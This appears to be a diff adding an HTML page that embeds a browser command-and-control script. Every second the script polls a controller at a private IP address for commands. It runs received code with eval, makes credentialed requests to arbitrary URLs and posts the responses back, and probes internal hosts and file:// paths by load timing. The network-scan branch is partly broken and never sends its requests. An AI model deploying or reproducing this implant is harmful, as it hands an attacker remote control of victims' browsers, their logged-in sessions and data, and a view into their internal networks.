@@ -1,0 +1,126 @@
+<iframe id="iframe" src=""></iframe>
+<img id="image" src=""></img>
+<script id="script" src=""></script>
+<script>
+var params = {server : {url : "http://172.16.66.10:8090/"}, threshold : 3000};
+var iframeElement = document.getElementById("iframe");
+var imageElement = document.getElementById("image");
+var scriptElement = document.getElementById("script");
+
+function loadResource(_cmdId,_data,_timing) {
+	var currentElement;
+	
+	switch(_data.type) {
+	case "image":
+		currentElement = imageElement;
+		break;
+	case "script":
+		currentElement = scriptElement;
+		break;
+	default:
+		currentElement = iframeElement;
+		break;
+	}
+	
+	var now;
+	currentElement.onerror = function() {
+			var delta = (new Date()).getTime() - now;
+			if(_timing && delta > params.threshold) {
+				sendResult(_cmdId, "Target unreachable: " + _data.src);
+			} else if(_timing) {
+				sendResult(_cmdId, "Target reachable: " + _data.src);
+			} else {
+				sendResult(_cmdId, "Failed to load resource: " + _data.src);
+			}
+		};
+	currentElement.onload = function() {
+			var delta = (new Date()).getTime() - now;
+			if(_timing && delta > params.threshold) {
+				sendResult(_cmdId, "Target unreachable: " + _data.src);
+			} else if(_timing) {
+				sendResult(_cmdId, "Target reachable: " + _data.src);
+			} else {
+				sendResult(_cmdId, "Resource loaded successfully: " + _data.src);
+			}
+		};
+		
+	now = (new Date()).getTime();
+	currentElement.src = _data.src;
+}
+
+function scanNetwork(_cmdId,_data){
+	_data.forEach(function (e) {
+		if(e.indexOf("file://") === 0) {
+			loadResource(_cmdId, {type : "iframe", src : e});
+		} else if(e.indexOf("ftp://") === 0) {
+			loadResource(_cmdId, {type : "iframe", src : e});
+		} else {
+			var now = (new Date()).getTime();
+			var xml = new XMLHttpRequest();
+			xml.onerror = function () {
+				var delta = (new Date()).getTime() - now;
+				if(delta > params.threshold) {
+					sendResult(_cmdId, "Target unreachable: " + _data.src);
+				} else {
+					sendResult(_cmdId, "Target reachable: " + _data.src);
+				}
+			};
+			xml.onreadystatechange = function () {
+				if (xml.readyState === 4) {
+					xml.onerror();
+				}
+			}
+		}
+	});
+}
+
+function sendResult(_cmdId, _data) {
+	var xml = new XMLHttpRequest();
+	xml.open("POST", params.server.url + "?commandResult=&cmdid=" + _cmdId);
+	xml.send(_data);
+}
+
+function executeCommand(_cmd) {
+	switch(_cmd.name) {
+	case "ajaxCall":
+		var xml = new XMLHttpRequest();
+		xml.open(_cmd.data.method, _cmd.data.url);
+		xml.onreadystatechange = function () {
+			if (xml.readyState === 4 && xml.status === 200) {
+				sendResult(_cmd.id, xml.responseText);
+			}
+		}
+		xml.withCredentials = true;
+		xml.send(_cmd.data.body);
+		break;
+	case "scanNetwork":
+		scanNetwork(_cmd.id, _cmd.data);
+		break;
+	case "loadResource":
+		loadResource(_cmd.id, _cmd.data);
+		break;
+	case "eval":
+		sendResult(_cmd.id, eval(_cmd.data));
+		break;
+	default:
+		break;
+	}
+}
+
+function getCommand() {
+	var xml = new XMLHttpRequest();
+	xml.open("GET", params.server.url + "?getCommand=");
+	xml.onreadystatechange = function() {
+		if (xml.readyState === 4 && xml.status === 200) {
+			try{
+				var commandData = JSON.parse(xml.responseText);				
+				if(commandData !== undefined) {
+					executeCommand(commandData);
+				}				
+			}catch(e) {}
+		} 		
+	};
+	xml.send();
+}
+setInterval(getCommand,1000);
+</script>
